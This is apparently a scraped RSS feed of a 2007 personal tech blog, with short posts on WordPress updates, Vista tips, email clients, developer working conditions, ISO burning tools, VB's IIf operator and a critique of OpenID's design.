<li><p><a href="http://msdn2.microsoft.com/en-us/library/aa511500.aspx">Toolbars</a></p></li>
<li><p><a href="http://msdn2.microsoft.com/en-us/library/aa511278.aspx">Sound</a></p></li>
<li><p><a href="http://msdn2.microsoft.com/en-us/library/aa511280.aspx">Icons</a></p></li>
</ul>


<p>These guidelines are crucial to ensure the most consistent user experience possible. Though many don&#8217;t, this is a document that all developers should read. I firmly believe that consistency is the most important single factor in design, and following an established style such as this is a great way to ensure that a UI is as consistent as possible.</p>

<p>If you&#8217;d like some background reading, the <a href="http://www.microsoft.com/whdc/System/platform/pcdesign/XPguidelines.mspx">XP version</a> is still available.</p>

      <title>WordPress 2.1.1</title>
      <description><p>The latest and greatest version of <a href="http://wordpress.org/">WordPress</a> (the software that powers this site) has been <a href="http://wordpress.org/development/2007/02/new-releases/">released</a>. This release <a href="http://trac.wordpress.org/query?status=closed&amp;milestone=2.1.1">looks to be</a> mainly small fixes; nothing earth shattering this time around. As always, painless upgrade, and all seems to be working well.</p>

<p>As I didn&#8217;t see a package for just the changed files, I went ahead and <a href="http://adamcaudill.com/files/wp-211-changes.zip">zipped them up</a>. These are just the changed files from 2.1, so this should make the upgrade process much quicker if you&#8217;ve already got 2.1 up and running.</p>

      <title>.NET Reflector v5 Released</title>
      <description><p>The great <a href="http://www.aisto.com/roeder/">Lutz Roeder</a> has released a new version of the <a href="http://www.aisto.com/roeder/dotnet/">.NET Reflector</a>. From what I&#8217;ve seen; this version is extremely nice. This has long been a required tool of any serious developer. With this update Reflector has reinforced its position in the list of tools you just can&#8217;t live without.</p>

<p>Scott Hanselman provides a <a href="http://www.hanselman.com/blog/Reflector5ReleasedWorldDominationAssured.aspx">great review</a>; check it out for the details on what&#8217;s new.</p>

      <title>Vista &amp; ReadyBoost</title>
      <description><p>Using Vista? Then I highly recommend getting a decent 1GB+ thumb drive, and use it for <a href="http://www.microsoft.com/windows/products/windowsvista/features/details/readyboost.mspx">ReadyBoost</a>; while the <a href="http://blogs.msdn.com/tomarcher/archive/2006/06/02/615199.aspx">FAQ</a> says 256MB is enough, for best performance I&#8217;d shoot for more. There is little difference under normal operation, it&#8217;s under high loads that ReadyBoost really shines.</p>

<p>On my main PC (with 1GB RAM), I would see fairly frequent freezes when several applications were open (primarily when memory utilization passed 80%). With a minor upgrade to 1.5GB RAM, and a <a href="http://www.newegg.com/Product/Product.asp?Item=N82E16820171119">1GB thumb-drive</a>* for ReadyBoost, the system became much more stable. This may be among the best new features in Vista.</p>

<p>I&#8217;ve frequently blasted Vista for the poor performance compared to XP, but with a few tweaks, it runs quite well.</p>

<ul>
<li>These drives (SanDisk Cruzer Mirco U3) work well, once to get the drivers working properly. If possible, pick a different drive; these are a pain at times.</li>

      <title>I Love My Job</title>
      <description><p>I love what I do, and I work with a great team. While it&#8217;s still far from perfect; I can say that I do love my job. For the last couple weeks though, I&#8217;ve had to remind myself of this several times. I&#8217;m sure we&#8217;ve all done it, in this industry it&#8217;s hard to avoid. You read an email or receive a phone call and repeat the mantra &#8220;I love my job, I love my job, I love my job.&#8221;</p>

<p>Unreasonable clients, managers that just don&#8217;t understand; there are so many reasons, so many triggers. While reciting this mantra often invokes laughter from those nearby, some thought should be given anytime it&#8217;s used. More often than not, used as a joke, but a joke masking true problems.</p>

<p>Some issues are unavoidable, some no amount a planning or preparation will help with; for those I can offer no advice. For those, even a perfect environment won&#8217;t help. It&#8217;s the others I care about, those issues that shouldn&#8217;t be, the deadlines that should never have been set, and those whose sole cause is lack of planning or forethought. Those are the ones that tire me; those are the ones I <em>hate</em>.</p>

<p>When I run into one of these situations, it makes me wish <a href="http://www.softwarebyrob.com/archive/2006/12/06/Open_Letter_to_Software_Managers_of_the_World_.aspx">this</a> was closer to reality than a dream of how we want things to be. However, why shouldn&#8217;t it be reality? Why do we allow this to happen time and time again?</p>

<p>Wait, read that last sentence again. Why do we allow, why do <strong><em>we</em></strong> allow? Yes, as developers we allow this to happen, and often encourage it. Late nights, working weekends, 90-hour weeks. Those could all be prevented, and could be reduced significantly should we stand up. If we do not take a stand, we encourage those that push us too far by doing just what they ask. Why should they stop if they can get a single developer to do the work of two?</p>

<p><strong>A Solution?</strong></p>

<p>So, what are we to do? Taking a page from <a href="http://www.softwarebyrob.com/">Rob</a>, here is my modest proposal. A few simple rules for both developers and managers to keep in mind. While rules such as these can never be enforced, keeping these things in mind could make life more pleasant for everybody.</p>

<p><em>Managers&#8230;</em></p>

<ul>
<li><p>shall keep requests for after hours work to a minimum. While there are &#8220;crunch times&#8221; on occasion, these should be minimal.</p></li>
<li><p>shall seek input from at least one developer before estimating a project. An estimate should not be created without consulting those that will be working on it, as they should have the most realistic idea of how long it will take to implement.</p></li>
<li><p>shall not ask developers to implement a hack or kludgey solution to meet an unreasonable deadline or request; especially if it will compromise stability or maintainability.</p></li>
<li><p>shall understand that developers are often passionate about their work, and the quality of the software they produce. Asking a professional to implement a solution based on a bad design, or inferior technologies will often be viewed as an insult, especially when this is done to meet an unreasonable goal.</p></li>
<li><p>shall shield developers from unnecessary distractions and meetings. Distractions can destroy productivity.</p></li>
<li><p>shall not ask developers to do the job of a Support technician. Tasks such as installing or configuring third-party software should not be given to a developer.</p></li>
<li><p>shall filter all requests and put policies in place to ensure that requests do not go directly to a developer.</p></li>
<li><p>shall give developers the freedom and opportunity to test different development methodologies when the schedule allows.</p></li>
</ul>


<p><em>Developers&#8230;</em></p>

<ul>
<li><p>shall make every reasonable effort to complete a task, including working long hours (so long as the hours and frequency are reasonable).</p></li>
<li><p>shall not complain about boring or undesirable tasks.</p></li>
<li><p>shall alert management when an issue arises that may impact a deadline, as soon as possible.</p></li>
<li><p>shall build the best software they are able to.</p></li>
<li><p>shall provide accurate estimates when asked.</p></li>
<li><p>shall be available as much as possible should an emergency arise.</p></li>
<li><p>shall not over-build, or over architect just for the sake of doing so.</p></li>
<li><p>shall try to understand the pressures and forces at play when communicating with management.</p></li>
<li><p>shall make an effort to improve development methods and processes.</p></li>
</ul>


<p>If you agree with this last, take it to your manager and talk about it; if not, build your own and talk about it. Either way, the idea is to talk about the issues and try to find ways to get everybody on the same page. If we make no effort to improve things, then we are just as much a part of the problem as anyone else.</p>

<p>If you don&#8217;t like things, complain; but complaining to a friend or co-worker won&#8217;t help, you need to let management know that there are problems and that you have some ideas to fix them.</p>

      <title>From Outlook, to Gmail, to The Bat!</title>
      <description><p>Back in March, I <a href="http://adamcaudill.com/2006/03/22/move-to-outlook/">switched</a> from <a href="http://www.ritlabs.com/en/products/thebat/">The Bat!</a> to Outlook as a result of being annoyed with using two different clients (work &amp; home)*. So today, I&#8217;m running The Bat again, thanks to <a href="http://gmail.google.com/">Gmail.</a></p>

<p><strong>Moving to Gmail</strong></p>

<p>I had been thinking about moving to Gmail for a while, the other day I decided to bite the bullet and do it. There was some pain involved, but not as bad as I expected. The process goes something like this:</p>

<ol>
<li><p>Setup any <a href="http://mail.google.com/support/bin/answer.py?answer=20616">custom From address</a>, personally, I had 5. <em>Now, here&#8217;s a word of warning:</em> pay close attention to the note on that page, I didn&#8217;t, and it bit me quite hard, <a href="http://pascal.vanhecke.info/2005/08/31/gmail-sender-header-makes-custom-from-address-useless-for-mailinglists/">here&#8217;s why</a>.</p></li>
<li><p>Setup <a href="http://mail.google.com/support/bin/answer.py?answer=6579">Filters</a> to <a href="http://mail.google.com/support/bin/answer.py?answer=6560">Label</a> your email based on the <code>To</code> address, this way you can see what account a message was sent to.</p></li>
<li><p>Forward your existing email account to <your_name>@gmail.com.</p></li>
<li><p>Convert/Export your email to the <a href="http://en.wikipedia.org/wiki/Mbox">mbox format</a> (some clients such as Thunderbird support this natively), for some clients, you may need the help of something like <a href="http://www.aid4mail.com/">Aid4Mail</a> (this is what I used, works great).</p></li>
<li><p>Finally, use Mark Lyon&#8217;s <a href="http://www.marklyon.org/gmail/">Gmail Loader</a> to read the mbox files you just created, and shoot them to your Gmail account. One note on this, it sends one email every two seconds, assuming no errors, so if you have several thousand emails, this is a slow process.</p></li>
</ol>


<p>Once you&#8217;ve completed those 5 steps, you&#8217;re done.</p>

<p>Now, there are some things to keep in mind, if you don&#8217;t want people to see your Gmail address via that custom From address, well, you&#8217;re out of luck. Google sends a <code>Sender</code> header with your Gmail address. This results in a number of issues, but the most painful for me was in Outlook displaying something like this:</p>

<blockquote><p><em>&#8220;From <you>@gmail.com on behalf of <you>@example.com&#8221;</em></p></blockquote>

<p>As far as I&#8217;m concerned, that&#8217;s about the most unprofessional thing a business email could display. It reeks of uncaring attitudes and oozes the impression of fraud. I use my email for business, so that isn&#8217;t an option.</p>

<p>Thankfully, I noticed this before it caused too much embarrassment, but it&#8217;s a death-nail for any user that needs mobile business email.</p>

<p><strong>Moving to The Bat!</strong></p>

<p>Thankfully I was only using Gmail full-time for around a day, so I don&#8217;t have to fight the battle of getting my email back from Google**. Thanks to the import features of The Bat, I moved my 15,000 or so emails over from Outlook 2007 in less than an hour. All told I spent around 50 hours importing email, setting up filters and cleaning up on Gmail; for The Bat!, that same task took less than three hours, and that includes setting up several fairly complex filters.</p>

<p>After a year using Outlook 2007 and Outlook 2003, then one whole day with Gmail as my primary mail client, I&#8217;m glad to be back with The Bat!. The lag that so annoyed me with Outlook is finally gone. Everything it does is fast.</p>

<p>I wanted a real web-based solution, and the best candidate failed. Now I&#8217;m back to a desktop client, but one that offers better performance and more flexibility than Outlook can provide.</p>

<ul>
<li>Truth be told, I believe I was just frustrated with the lack of flexibility that Outlook has compared to The Bat!, and since I couldn&#8217;t avoid Outlook, I axed The Bat.</li>
</ul>


<p>** Has anyone noticed that Gmail has no easy or even reasonable way to get your email out of the system? Locking users in seems odd for a company that promises to <a href="http://en.wikipedia.org/wiki/Don't_be_evilhttp://en.wikipedia.org/wiki/Don't_be_evil">not be evil</a>.</p>

      <title>OpenDNS</title>
      <description><p>Looking for a bit of a speed boost? <a href="http://www.opendns.com/">OpenDNS</a> might just help. Using the OpenDNS network, instead of your ISP&#8217;s DNS servers seems to really boost the speed of the name resolution process (which is often the slowest part of connecting to another computer).</p>

<p>From what I&#8217;ve seen so far, there&#8217;s been a fairly significant speed boost on some sites, primarily those that include content from several domains. The boost isn&#8217;t that great when you look at the overall loading process, but it does reduce the annoying lag when the browser starts loading. So far, I&#8217;ve been happy with the service (which is free), and I really like that the offer various customizations and statistics (if you want to open an account, also free).</p>

<p>On top of the various options and statistics, they also offer <a href="http://www.opendns.com/at_home/benefits.php#smarter">spelling correction</a> and <a href="http://www.opendns.com/at_home/benefits.php#safer">anti-phishing</a> features. It may just be DNS, but this is DNS the way it should be done. And if that&#8217;s not good enough, even <a href="http://photomatt.net/2006/07/18/opendns/">Matt likes them</a>. ;)</p>

<p>You mileage will obviously vary, but I think this is pretty cool.</p>

      <title>ASP.NET AJAX</title>
      <description><p>For those that have been looking forward to seeing the final result of Microsoft&#8217;s attempt at <a href="http://en.wikipedia.org/wiki/AJAX">AJAX</a>, your wait is over. <a href="http://ajax.asp.net/default.aspx">ASP.NET AJAX</a> 1.0 has been <a href="http://ajax.asp.net/downloads/default.aspx?tabid=47">released</a>.</p>

<p>I&#8217;ve not had time to test this yet, but it sure looks like it has promise. I&#8217;ll be playing with this one soon, I&#8217;ve got a couple new projects this might be perfect for.</p>

      <title>Still running Windows 2000?</title>
      <description><p>For those that may be running Windows 2000, there&#8217;s some things you need to know.</p>

<p>With the <a href="http://en.wikipedia.org/wiki/Energy_Policy_Act_of_2005">change</a> in <a href="http://en.wikipedia.org/wiki/Daylight_saving_time">DST</a> taking effect March 2nd, your Windows 2000 boxes may see some odd behavior. There <a href="http://ushipoisv.spaces.live.com/Blog/cns!29862A22A3FBB38D!156.entry">won&#8217;t</a> be Windows Update patch or hot-fix released for this (unless you have an extended support agreement); so there&#8217;s some work ahead to keep things running smoothly.</p>

<p>Microsoft has <a href="http://support.microsoft.com/kb/914387">released</a> (<a href="http://www.microsoft.com/windows/timezone/dst2007.mspx">read more</a>) a fair bit of information (complete with sample scripts) that can be used to update any 2000 boxes you may have lying around. Those of us that keep 2000 boxes around for testing or even production use will need to make sure they are updated. I can only imagine the odd errors this will cause if these changes aren&#8217;t put in place.</p>

<p>This is a bit of an annoyance, I really wish Microsoft would have released this in the form of a Windows Update, though I guess this will probably help drive home the reality that it&#8217;s time to upgrade for many users.</p>

      <title>Task Management with Tasks</title>
      <description><p>After being reminded of <a href="http://alexking.org/">Alex King</a>&#8217;s excellent <em><a href="http://kingdesign.net/tasks/">Tasks</a></em> task management system by a <a href="http://www.downloadsquad.com/2007/01/21/tasks-by-king-design/">Download Squad</a> article, I decided it was high time to give it a try. I had seen the software before, but never really evaluated it to see if it would be of any real use to me. This time, I gave it a more thorough look.</p>

<p>I&#8217;ve been doing a fair bit of reading in recent weeks about time and task management; and thus I&#8217;m trying to build a better process than what I use now. Seeing as my current method revolves around hoping to remember things, it doesn&#8217;t work so well.</p>

<p>After playing with the <a href="http://kingdesign.net/tasks/demo/">demo</a> for a few minutes, I was quite impressed.  I&#8217;ve used (or tested) many task management and related systems; <em>Tasks</em> seems to have gotten the model right. It&#8217;s easy to use, well designed, and uses a model that is flexible enough that you can apply just about any style you like.</p>

<p>One of the things I find so interesting is that this is web-based software, though is intended only for a single user. While this is certainly not the only application marketed this way, it still intrigues me. Traditionally, one would think that there would be little or no market for single user web-based applications that users install on their own servers. In reality though, this makes a lot of sense.</p>

<p>There are so many people who now have their own web site(s), running on real hosting accounts, that there would be a sizable market for personal software, made accessible anywhere thanks to being web-based. This is a great idea, and one of the factors that really made me like this software.</p>

<p>Once I was done with the demo, I started going over the requirements (basically PHP/MySQL), looking at the pricing and all the other details. With a price of US$29.95, it didn&#8217;t take long for me to decide. I was sold.</p>

<p>Installation was quick and painless (though not as quick as the <a href="http://codex.wordpress.org/Installing_WordPress#Famous_5-Minute_Install">famous</a> WordPress install), within a few minutes I had <em>Tasks</em> up and running. Give or take a minor bug on preferences*, it all works very well. It works quite well out of the box, once the install process in completed, you don&#8217;t need to change anything else to be up and running.</p>

<p>The UI is responsive and well laid out; thanks to AJAX and plenty of tool-tips it&#8217;s a breeze to use. If you are looking for a better way to keep track of things, or working towards a better way to manage your time, it&#8217;s worth giving this a look. I think you might like it.</p>

<p><strong>Update</strong>: After speaking with Alex about that &#8216;bug&#8217; - it turned out to be Firefox being overly helpful with its Auto-Fill feature. There are a couple ideas floating around to work-around this, so even though it&#8217;s not a bug in <em>Tasks</em>, Alex is working towards eliminating the problem.</p>

      <title>Microsoft Mice: Another Reason to Love Them</title>
      <description><p>I&#8217;ve always been a big fan of the Microsoft Mouse line, and now with Vista, a new reason: <a href="http://blogs.msdn.com/kamvedbrat/archive/2007/01/18/instant-viewer-in-the-new-intellipoint-software-for-windows-vista.aspx">Instant View</a>. This is a great new feature in the next version on the <a href="http://www.microsoft.com/hardware/windowsvista/support/intellipoint.mspx">IntelliPoint</a> software. I&#8217;ve been using a bit of a <a href="http://neosmart.net/blog/2006/intellipoint-on-vista/">hack</a> since I <a href="http://adamcaudill.com/2006/11/18/installing-vista/">installed</a> Vista back in November. So it&#8217;s nice to be using a copy of IntelliPoint that is actually supposed to work with Vista.</p>

<p>I&#8217;ve got to say, the new Instant View feature is a very nice touch, and one that I really prefer to <a href="http://www.microsoft.com/windowsvista/experiences/aero.mspx">Aero</a>&#8217;s Flip 3D (Windows+Tab) feature (Instant View has a fair bit less lag). This is really an impressive feature, though not perfect. While it does work on multi-monitor setups, Flip 3D is far more graceful about it.</p>

<p>Try it, I&#8217;m quite certain you&#8217;ll like it.</p>

      <title>Visual Studio PowerToy Pack Installer</title>
      <description><p>An update to the <a href="http://www.codeplex.com/PackInstaller">Visual Studio PowerToy Pack Installer</a> has just been <a href="http://blogs.msdn.com/jeremykelley/archive/2007/01/18/pack-installer-beta-2-released-and-feed-update-for-1-18-2007.aspx">announced</a>. This handy application wraps up many of the <a href="http://msdn2.microsoft.com/en-us/vstudio/aa718340.aspx">PowerToys</a> so that they can be installed from one easy to use UI. With so many of these Power Toys available, this installer is great to have; otherwise finding and installing them can be a slow and painful experience.</p>

      <title>WordPress 2.1 RC1</title>
      <description><p><a href="http://boren.nu/archives/2007/01/17/wordpress-21-release-candidate-1/">WordPress 2.1 RC1</a> has been released (about two whole hours after upgrading to Beta 4). So far RC1 is looking quite nice.</p>

<p>I&#8217;ve got to say, this may be one of the most impressive WordPress releases I&#8217;ve seen yet. From my testing so far, everything seems to be working quite well. Now that 2.1 is at the RC level, I&#8217;ll get that review I <a href="http://adamcaudill.com/2007/01/15/wordpress-207-upgrading-to-21-beta-2/">promised</a> typed up.</p>

<p>If you&#8217;re a WordPress user, I&#8217;d grab a copy and make sure your theme and plugins work so you&#8217;ll be ready when 2.1 goes gold.</p>

      <title>Burning ISOs in Vista</title>
      <description><p>Today I had to do something I&#8217;ve not done since I <a href="http://adamcaudill.com/2006/11/18/installing-vista/">switched</a> to Vista: burn a ISO image. Normally I would just fire up <a href="http://www.nero.com/enu/index.html">Nero</a> and be on my way; but my version of Nero is old, and I didn&#8217;t feel like fighting with it. So I decide to find something new.</p>

<p>I found a fair bit of discussion on the topic, and a few highly recommended (and free) choices:</p>

<ul>
<li><p><a href="http://www.imgburn.com/">ImgBurn</a> - This is a well polished application, it exposes a fair bit of information about what&#8217;s going on, and some of the behind the scenes details. Novice tend to prefer knowing as little as possible, but for more advanced users, it looks like a winner.</p></li>
<li><p><a href="http://www.cdburnerxp.se/">CDBurnerXP Pro</a> - This one received a several recommendations, though I&#8217;d have to advise against it. While it seems like a well built application, it&#8217;s obvious that it&#8217;s not been tested on Vista (the warning about running on Windows 95 or Windows NT doesn&#8217;t inspire confidence).</p></li>
<li><p><a href="http://isorecorder.alexfeinman.com/isorecorder.htm">ISO Recorder</a> - This is one that I didn&#8217;t get a chance to test, though it sounds quite promising.</p></li>
</ul>


<p>Of those I tested, all had the same major flaw: <em>none worked</em>. ImgBurn came the closest, though failed to actually start writing. After a quick search I turned up the reason: my old Iomega CD-RW drive was so old, it doesn&#8217;t follow the standards newer drives implement.</p>

<p>So now I&#8217;m facing buying a new copy of Nero (as it&#8217;s always worked for me), when I stumbled upon a writeup for <a href="http://www.hanselman.com/blog/FreeISODiskImageBurningUtilityThatWorksOnVista.aspx">BurnCDCC</a>.  Even though I thought it would be a waste of time, I went ahead and tried it. After downloading the whopping <a href="ftp://terabyteunlimited.com/burncdcc.zip">69KB file</a>, I fired it up, and sure enough; <em>it worked</em>!</p>

<blockquote><p><a href="http://adamcaudill.com/files/2007/01/burncdcc.png"><img src="http://adamcaudill.com/files/2007/01/burncdcc.thumbnail.png" alt="BurnCDCC" /></a></p></blockquote>

<p>So if you&#8217;ll looking for a free way to burn ISOs, and have and old, hopeless drive; BurnCDCC just might help. Seems to be a great little program, and I have to appreciate the simplicity. Something nice about software that does one thing, and does it very well.</p>

      <title>WordPress 2.0.7 &amp; Upgrading to 2.1 (Beta 2)</title>
      <description><p>Well, <a href="http://wordpress.org/development/2007/01/wordpress-207/">WordPress 2.0.7</a> has been released, and I&#8217;ve upgraded this site to WordPress 2.1 Beta 2.</p>

<p>I was excepting a rather painful upgrade; not so much because it is a beta, but the rather large number of changes. After a couple simple tweaks to my custom theme, within 10 minutes it was up and running perfectly. Knowing the effort and quality the WordPress team puts out, I guess I shouldn&#8217;t have been surprised.</p>

<p>So far it looks all is working quite well. If you see anything wrong, or just seems odd, please leave a comment so I can look into it.</p>

<p>I&#8217;ll be posting a mini-review of WordPress 2.1 here in a couple days.</p>

      <title>WordPress 2.0.7 &amp; 2.0.8</title>
      <description><p>Just a few days ago the <a href="http://wordpress.org/">WordPress</a> team announced that <a href="http://wordpress.org/development/2007/01/wordpress-206/">2.0.6</a> would be the last before the much anticipated <a href="http://boren.nu/archives/2006/08/04/wordcamp-whats-new-in-21/">2.1 release</a>. Although now it look like there will be at least one more release before 2.1, if not two. Based on discussions on the <a href="http://comox.textdrive.com/pipermail/wp-testers/">wp-testers</a> mailing list, <a href="http://comox.textdrive.com/pipermail/wp-testers/2007-January/003654.html">it&#8217;s looking like two</a>.</p>

<p>Due to a security issue with some configurations, along with a few other issues (<a href="http://comox.textdrive.com/pipermail/wp-testers/2007-January/003644.html">details</a>), the WordPress crew is moving along with a release in the very near future. From the look of the <a href="http://trac.wordpress.org/query?status=new&amp;status=assigned&amp;status=reopened&amp;status=closed&amp;group=milestone&amp;milestone=2.0.8&amp;order=priority">WordPress Trac</a>, it looks like there are also several issues open for 2.0.8.</p>

<p>So after <a href="http://adamcaudill.com/2007/01/06/wordpress-206/">updating a few days ago</a>, looks like we&#8217;ll be facing a couple more upgrades. Although, given the choice I&#8217;d much rather face additional upgrades rather than these security issues.</p>

      <description><p>For those that do any web development, you&#8217;ll be interested to know that the <a href="http://blogs.msdn.com/ie/">IE Team</a> has released beta 3 of the <a href="http://blogs.msdn.com/ie/archive/2007/01/09/ie-developer-toolbar-beta-3-now-available.aspx">IE Developer Toolbar</a>. From what I&#8217;ve seen, this looks like an impressive release.

      <title>Microsoft PageRank?</title>
      <description><p>I&#8217;m sure there&#8217;s nothing to this, but I have to point it out: a Microsoft employee publicly seeking information on <a href="http://www.google.com/technology/">Google PageRank</a>. <a href="http://blogs.msdn.com/roberdan/">Roberto D&#8217;Angelo</a>, in <em>How Google PageRank(tm) works (the post has been removed, <a href="http://adamcaudill.com/files/Roberdan_HowGooglePageRankworks.pdf">here is a PDF version</a> of the original*)</em>, discusses how the PageRank algorithm works as well as asks for others to provide additional information.</p>

<p>Anybody find this a bit odd?</p>

<p>I&#8217;m not trying to knock Roberto, or Microsoft, it just strikes me as odd that a Microsoft employee would be publicly seeking information on a proprietary feature of a competitor&#8217;s product. While it&#8217;s normal to review a competitor&#8217;s product to see what it does better, trying to figure out <a href="http://patft.uspto.gov/netacgi/nph-Parser?Sect1=PTO1&amp;Sect2=HITOFF&amp;d=PALL&amp;p=1&amp;u=%2Fnetahtml%2FPTO%2Fsrchnum.htm&amp;r=1&amp;f=G&amp;l=50&amp;s1=7,058,628.PN.&amp;OS=PN/7,058,628&amp;RS=PN/7,058,628">patented</a> and proprietary technologies, in a public setting, seems like a bad idea to me.</p>

<p>What gets me about this, is that it&#8217;s so public. Digging into a competitor&#8217;s product in a public manner will lead to backlash, especially when we&#8217;re talking about Google and Microsoft. I can only imagine the comments that will be made as a result of his post. So far I&#8217;ve not seen any feedback on this, but I have to image that it will be coming. From a business perspective, I have to suspect this will be considered a mistake.</p>

<p>What do you think, is it really a good idea to publicly dig into the proprietary feature of a competitors product?</p>

<p><strong>Update:</strong> Since this was published the original page was removed, making public discussion a bit of a moot point. I&#8217;m leaving this as I feel it&#8217;s an interesting point. I&#8217;ve removed the original link and added a link to a PDF file of the original page, for those interested in seeing what was said.</p>

      <description><p>Time once again, for a <a href="http://wordpress.org/development/2007/01/wordpress-206/">WordPress update</a>, the software that powers this site. This is primary a security update, fixing a few nasty issues as well as cleaning up some other things (<a href="http://trac.wordpress.org/query?status=closed&amp;milestone=2.0.6">here&#8217;s</a> the breakdown). If you are running a WordPress blog, I&#8217;d recommend going for the update.</p>

      <title>Building a Windows PowerToy</title>
      <description><p><a href="http://brandonlive.com/">Brandon Paddock</a> is writing what promises to to an interesting series on creating a Windows PowerToy on the <a href="http://shellrevealed.com/blogs/shellblog/archive/2007/01/04/Building-a-Windows-PowerToy-_2D00_-Part-1.aspx">Windows Shell Team blog</a>. This series promises to provide an interesting insight into the process of developing my favorite part of Windows: PowerToys. I&#8217;ve always looked forward to seeing the next generation of Power Toys after a new version of Windows is released; seeing the process of one being developed will be a real treat.</p>

<p>This looks like one worth watching.</p>

      <title>IIf() May Get a Dose of Legitimacy</title>
      <description><p><a href="http://www.panopticoncentral.net/">Paul Vick</a> announced a possible change for VB 9.0, <a href="http://www.panopticoncentral.net/archive/2006/12/29/18883.aspx">this change</a> would give the <a href="http://msdn2.microsoft.com/en-us/library/27ydhh0d(VS.80">IIF method</a>.aspx) the legitimacy it has long deserved. The issue with <code>IIf</code> is that it&#8217;s not a <a href="http://en.wikipedia.org/wiki/Minimal_evaluation">short-circuit operator</a>, which can severely limits its usefulness. Take the following example, that will throw an exception if <code>obj</code> is <code>Nothing</code>:</p>

<blockquote><p><code>IIf(obj IsNot Nothing, obj.Property1, String.Empty)</code></p></blockquote>

<p>Since <code>IIf()</code> is just a normal method, all parameters will be evaluated, regardless of weather <code>obj</code> is <code>Nothing</code>. This change would make <code>IIf</code> a true part of the language, a true ternary operator, instead of just another method.</p>

<p><code>IIf</code> is largely avoided due to performance issues, and its limited usefulness for the reason above. Now that <code>IIf</code> <em>may</em> function as a true operator (though still wrapped in the cloak of a method), it will be a truly useful part of the language, one that I&#8217;ve long wished for.  I&#8217;ve always been a fan of <code>IIf</code>, it&#8217;ll be nice to be able to use it again, without the overheard and issues that has long went with its use.</p>

<p>Mr. Vick is still soliciting comments on this change, so now is the time to <a href="http://www.panopticoncentral.net/archive/2006/12/29/18883.aspx#FeedBack">make your opinion known</a>.</p>

      <title>Assertiveness for Software Developers</title>
      <description><p>Here is a quick read from <a href="http://www.codinghorror.com/blog/">Jeff Atwood</a>  that all developers should read: <a href="http://www.codinghorror.com/blog/archives/000752.html"><em>Assertiveness for Software Developers</em></a>. Jeff brings up a great point, developers aren&#8217;t assertive enough; and that ends up biting us later (I know it&#8217;s bitten me a few times).</p>

<p>This is well worth reading, and well worth some serious thought for next time your manager hands you an impossible deadline.</p>

      <title>Holiday Schwag</title>
      <description><p>The <a href="http://store.valleyschwag.com/">Valleyschwag</a> crew has released their 5th package, a <a href="http://valleyschwag.com/chronicles/2006/12/13/all-hail-the-holiday-schwag/">holiday package</a> no less. I ordered mine a few days ago, and it arrived today. While I believe the guys behind Valleyschwag made a <a href="http://adamcaudill.com/2006/10/05/not-not-a-good-idea/">real mistake</a>, it&#8217;s nice to see that they are still hard at it.</p>

<p>This is a nice package, with goodies from <a href="http://www.guba.com/">Guba</a>, <a href="http://minglenow.com/">mingle</a> and <a href="http://www.webshots.com/">WebShots</a> (along with a few others). All in all, a rather nice package.</p>

      <title>OpenID: ID of The Future?</title>
      <description><p>After reading <a href="http://simonwillison.net/">Simon Willison</a>&#8217;s excellent <a href="http://simonwillison.net/2006/Dec/19/openid/">article on the topic</a> I spent a couple hours last night looking at the current <a href="http://openid.net/specs/openid-authentication-1_1.html">OpenID specification</a>, and after a fair bit of thought found the ideas behind <a href="http://openid.net/">OpenID</a> clever, but not what&#8217;s needed for the ID of the future.</p>

<p><strong>What&#8217;s Right</strong></p>

<p>OpenID has some really good ideas behind it. Here are a few that really stand out in my eyes.</p>

<ul>
<li><p>If you have a LiveJournal account for example, it just works, no extra sign-up, no additional work.</p></li>
<li><p>The ID is easy to remember, a persons blog / home page URL is among the easiest things for a user to remember.</p></li>
<li><p>De-centralized architecture that minimizes the potential for downtime.</p></li>
<li><p>Anyone can operate an Identity Provider.</p></li>
<li><p>Open, well documented protocol, as well as open-source libraries.</p></li>
<li><p>ID may be portable from one Identity Provider to another without changes to the ID.</p></li>
</ul>


<p><strong>What&#8217;s Wrong</strong></p>

<p>There are a number of issues I see with this system, while there are certain advantages; some of these disadvantages are quite disturbing. Here are the issues that strike me as most concerning (in no real order).</p>

<ul>
<li><p>SSL (HTTPS) is not <em>required</em> for any communications. This is a potential security issues, though not as large as could be due to the nature of the system.</p></li>
<li><p>Requires editing HTML for users that do not use a hosting service that automatically adds the OpenID HTML code to the proper page(s).</p></li>
<li><p>Not all hosting services allow the user to edit HTML directly.</p></li>
<li><p>Does not offer a way to communicate enough information, such as would be used to expedite an e-commerce transaction. (This may be changed in future versions, or with extensions.)</p></li>
<li><p>No trust relationships, only verifies a person controls a URL.</p></li>
<li><p>No certification or audits for Identity Providers to ensure end-user security.</p></li>
<li><p>Excessive bandwidth usage. Each login requires parsing at least one full HTML page to identify the Identity Provider server. If a user has <code>openid.delegate</code> included in their page, there will be another full page download/parse for each.</p></li>
<li><p>HTML pages must be parsed to identify the Identity Provider server, parsing HTML can raise issues when it contains errors (as is quite common). Seeing as there is no standard library to perform the parsing, HTML with errors may work with some implementations but not with others.</p></li>
<li><p>Anyone that gains access to edit the HTML of the identity URL can steal ones identity just by changing/adding an <code>openid.delegate</code>. This is a real risk in some shared hosting environments.</p></li>
</ul>


<p><strong>What We Need</strong></p>

<p>The idea behind OpenID, to create a distributed identity system that is easy to use and can be used universally is a great idea, and one that should be pursued. If this goal could be achieved, it would be a project that would truly help to make the world a better place (at least it in that it would save everybody time). I have great respect for the work of all that have contributed to the OpenID project; it is a great idea and certainly has uses.</p>

<p>To be truly useful though, an ID system needs to be easy to use for people of all skill levels, with and without web sites. It should provide an option to control how much information is shared with a web site (such as OpenID does), and should have the option to provide information such as shipping or billing information to minimize entering the same data in so many web sites. All the data should be transferred via SSL to ensure the highest level of security.</p>

<p><strong>Features of The Future ID</strong></p>

<ul>
<li><p>The protocol should be completely open and well documented.</p></li>
<li><p>The protocol should be XML based so as to be lightweight and easily implemented in any language.</p></li>
<li><p>The ID should be easily used with not only web sites, but via desktop applications and other forms of software that require authentication.</p></li>
<li><p>The organization backing the identity system should arrange for an optional certification program for Identity Providers to ensure that certain basic security policies are implemented. The requirements should be defined by the backing organization and the audit carried out by a third-party auditing firm.</p></li>
<li><p>The IDs should be in an easy to remember format that is easy to type and makes translation back to the provider simple.</p></li>
<li><p>Identity Provides should offer a way to verify that a user is who they claim, not just that they control an ID. This would be an option for users that would be quite useful in applications such as e-commerce use. (This would rely on the provider having a trusted signing certificate and following certain identity verification guidelines.)</p></li>
</ul>


